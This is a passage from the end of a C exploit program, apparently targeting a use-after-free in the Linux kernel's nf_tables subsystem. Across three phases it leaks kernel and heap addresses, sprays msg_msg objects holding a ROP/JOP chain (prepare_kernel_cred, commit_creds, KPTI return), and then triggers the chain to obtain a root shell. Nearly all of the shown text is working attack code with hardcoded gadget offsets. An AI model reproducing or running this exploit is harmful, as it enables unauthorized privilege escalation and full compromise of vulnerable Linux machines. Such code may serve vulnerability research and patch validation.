    phase2_leak(nl, portid, xa_node_addr+0x29, leak_msg_queue);
    printf("\n");
    system("nft flush ruleset");
    sleep(1);

    setup(nl, portid, PHASE2_TABLE_NAME, PHASE2_BASE_CHAIN, PHASE2_VICTIM_CHAIN, PHASE2_TRIGGER_MAP, PHASE2_TRIGGER_MAP_ID);
    batch1(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch2(nl, portid, PHASE2_TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch4(nl, portid, PHASE2_TABLE_NAME, PHASE2_VICTIM_CHAIN);
    sleep(1);
    printf("============ [LEAK 4 ADDRESS (KMALLOC-CG-2K HEAP): 0x%llx] ============\n", msg_queue_addr+0xc0);

    // msg_queue_addr->q_messages == msg_queue_addr+0xc0
    // but we need to do msg_queue_addr+0xc2 because
    // nftnl_expr_get_str will terminate on null bytes
    // causing address output to be read wrongly
    // so we read msg_queue_addr+0xc1, it'll read a 7-byte address,
    // then we'll bitshift by 1 byte to resolve the actual address
    // this is ok because we know it the heap addr will always be byte-aligned
    // the only time this fails is if the last 2 bytes of the heap address is 0000
    // in which case, we can always adjust the exploit; or re-run.
    phase2_leak(nl, portid, msg_queue_addr+0xc1, leak_heap_addr);
    printf("\n");
    system("nft flush ruleset");
    sleep(1);

    if (!heap_addr || heap_addr < 0xffff000000000000) {
        perror("[!] couldn't get kmalloc-2k addr");
        exit(-1);
    }

}



// place INIT_TASK into rdi
// call PREPARE_KERNEL_CRED --> stored in RAX
// place RAX into RDI
// call COMMIT_CREDS
#define POP_RDI_RET             0x0c3654UL // 0xffffffff810c3654 : pop rdi ; ret
#define PUSH_RAX_RET            0x054b94UL // 0xffffffff81054b94 : push rax ; ret
#define PREPARE_KERNEL_CRED     0x112670UL
#define COMMIT_CREDS            0x1123d0UL 
#define INIT_TASK               0x1e11100UL
#define IRETQ                   0x03d68fUL // 0xffffffff8103d68f : iretq
#define SWAPGS_RESTORE_USERMODE 0x10017f0UL // 0xffffffff8200182b

// use this to control the nft_chain object
// in this phase, we want to control rules->next, which is at offset 16 (or 0x10)
int build_exp_table2(struct mnl_socket *nl, uint32_t portid) {
    struct nftnl_table     *table;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;
    
    uint8_t payload[128];
    uint offset = 0;
    memset(&payload[offset], 'A', 16);
    offset += 16;


    // make it point to msg_msg-2k leak + 0x230 -- this is where we
    // determined our fake rule to start at
    // pointer, so size is uint64_t
    uint64_t target = heap_addr+0x230;
    memcpy(&payload[offset], &target, sizeof(target));
    offset += sizeof(target);

    // fill remaining to ensure we get allocated in kmalloc-cg-128
    memset(&payload[offset], 'B', 96);
    offset += 96;

    if (DEBUG) {
        printf("[DEBUG] before alloc -- check slub-dump kmalloc-cg-128\n");
        getchar();
    }

    table = nftnl_table_alloc();
    if (!table) { perror("nftnl_table_alloc"); return -1; }
    nftnl_table_set_data(table, NFTNL_TABLE_NAME, payload, offset);
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // sends the entire batch to create tables and stuff
    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);

    if (ret == 0) {
        // printf("[+] should have created table\n");
        if (DEBUG) {
            printf("[DEBUG] after alloc -- check slub-dump kmalloc-cg-128\n");
            getchar();
        }
        return 0;
    }
    return -1;
}


void phase3(struct mnl_socket *nl, uint32_t portid) {
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret = 0;

    // use the UAF to place table->name at the old location of nft_chain, then make the rules->next offset point to our msg_msg-2k leak + 0x30
    setup(nl, portid, PHASE2_TABLE_NAME, PHASE2_BASE_CHAIN, PHASE2_VICTIM_CHAIN, PHASE2_TRIGGER_MAP, PHASE2_TRIGGER_MAP_ID);
    batch1(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch2(nl, portid, PHASE2_TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    // printf("***************before delete*********************\n");
    batch4(nl, portid, PHASE2_TABLE_NAME, PHASE2_VICTIM_CHAIN);
    sleep(1);
    
    // table->name will be at old location of nft_chain
    // but remember that the obj is still interpreted as a nft_chain
    build_exp_table2(nl, portid);

    // Changing control flow
    uint64_t fake_rule_addr = heap_addr + 0x230;
    printf("[+] Fake rule address: 0x%llx\n", fake_rule_addr);
    uint64_t fake_expr_addr = heap_addr + 0x260;
    printf("[+] Fake expr ops: 0x%llx\n", fake_expr_addr);


    printf("[*] free kmalloc-2k spray to be reclaimed later\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], &msg_msg_2k, sizeof(msg_msg_2k)-sizeof(long), 0x43, 0) < 0) {
            perror("[!] free msg_msg failed");
            exit(-1);
        }
    }
    sleep(1);
    printf("\n");

    memset(&msg_msg_2k, 0, sizeof(msg_msg_2k));
    *(long *)&msg_msg_2k.mtype = 0x43;
    *(uint8_t *)&msg_msg_2k.mtext[0x215] = 0x10;
    *(long *)&msg_msg_2k.mtext[0x218] = fake_expr_addr;
    *(long *)&msg_msg_2k.mtext[0x278] = kbase + 0xafddd8; // JOP
    // 0xffffffff81afddd8 : push rsi ; jmp qword ptr [rsi - 0x70]

    // 0x218 - 0x70 = 0x1a8
    *(long *)&msg_msg_2k.mtext[0x1a8] = kbase + 0x0c3652;
    // 0xffffffff810c3652 : pop rsp ; pop r15 ; ret

    // pop rsp: rsp = [0x218]
    // pop r15: rsp advance to [0x220]?
    *(long *)&msg_msg_2k.mtext[0x220] = kbase + POP_RDI_RET;
    *(long *)&msg_msg_2k.mtext[0x228] = kbase + INIT_TASK;
    *(long *)&msg_msg_2k.mtext[0x230] = kbase + PREPARE_KERNEL_CRED; // return value in rax

    // pop rsi; ret
    *(long *)&msg_msg_2k.mtext[0x238] = kbase + 0x1fefd5; // 0xffffffff811fefd5 : pop rsi ; ret
    // set rsi
    *(long *)&msg_msg_2k.mtext[0x240] = heap_addr + 48 + 0x3a0 + 0x70;
    *(long *)&msg_msg_2k.mtext[0x248] = kbase + 0xc9b4bc; // 0xffffffff81c9b4bc : push rax ; jmp qword ptr [rsi - 0x70]
    // now rax is on stack and we jumped to 0x3a0
    *(long *)&msg_msg_2k.mtext[0x3a0] = kbase + POP_RDI_RET; // save rax to rdi, then return 
    *(long *)&msg_msg_2k.mtext[0x250] = kbase + COMMIT_CREDS;
    // 4 pops + ret to skip over 0x260 - 0x278
    *(long *)&msg_msg_2k.mtext[0x258] = kbase + 0x0a015a; // 0xffffffff810a015a : pop rbp ; pop r12 ; pop rbp ; pop rbx ; ret

    // VERY LONG KPTI TRAMPOLINE
    // the amount of dummy qwords is to get rid of all the pops...
    *(long *)&msg_msg_2k.mtext[0x280] = kbase + SWAPGS_RESTORE_USERMODE+36; 

    *(long *)&msg_msg_2k.mtext[0x288] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x290] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x298] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2a0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2a8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2b0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2b8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2c0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2c8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2d0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2d8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2e0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2e8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2f0] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x2f8] = 0; // dummy qword
    *(long *)&msg_msg_2k.mtext[0x300] = 0; // dummy qword

    *(long *)&msg_msg_2k.mtext[0x308] = user_rip;
    *(long *)&msg_msg_2k.mtext[0x310] = user_cs;
    *(long *)&msg_msg_2k.mtext[0x318] = user_rflags;
    *(long *)&msg_msg_2k.mtext[0x320] = user_sp;
    *(long *)&msg_msg_2k.mtext[0x328] = user_ss;

    printf("[+] spray new msg_msg_2k\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgsnd(msqid[i], &msg_msg_2k, sizeof(msg_msg_2k) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }

    sleep(1);
    

    signal(SIGSEGV,get_shell);
    printf("[+] registered signal handler, pls work\n");

    // Trigger ROP
    printf("[*] Before ROP trigger, MAY fail as there is a chance our fake chain didn't get allocated in the leaked heap slot.\n");
    getchar();
    // rop rule
    struct nftnl_rule *trigger_rule = nftnl_rule_alloc();
    nftnl_rule_set_u32(trigger_rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(trigger_rule, NFTNL_RULE_TABLE, PHASE2_TABLE_NAME);
    nftnl_rule_set_str(trigger_rule, NFTNL_RULE_CHAIN, PHASE2_BASE_CHAIN);

    // expr
    struct nftnl_expr *trigger_expr = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(trigger_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(trigger_expr, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
    nftnl_rule_add_expr(trigger_rule, trigger_expr);

    // send netlink message
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, trigger_rule);
    nftnl_rule_free(trigger_rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}
    mnl_nlmsg_batch_stop(batch);
    system("nft list ruleset");
    printf("[+] completed phase 3?\n");
}

/* ---------------------------------------------------------------------------
 * main
 * ------------------------------------------------------------------------- */
 
int main(int argc, char **argv) {   
    struct mnl_socket *nl;
    uint32_t portid;
    int ret;
    printf("[*] calling 'nft flush ruleset' to clean any prev sessions...\n");
    system("nft flush ruleset");
    save_state();
    seq = time(NULL);
    nl = nl_open(&portid);
    if (!nl)
        exit(EXIT_FAILURE);

    printf("[*] phase 1: kernel base addr leak\n");
    phase1(nl, portid);
    system("nft flush ruleset");
    printf("\n");
    
    
    printf("[*] phase 2: leaking heap addr\n");
    phase2(nl, portid);
    system("nft flush ruleset");
    printf("\n");

    printf("[*] phase 3: ROP and shell\n");
    phase3(nl, portid);
    printf("\n");

    mnl_socket_close(nl);
    system("nft flush ruleset");

    return ret == 0 ? EXIT_SUCCESS : EXIT_FAILURE;
}
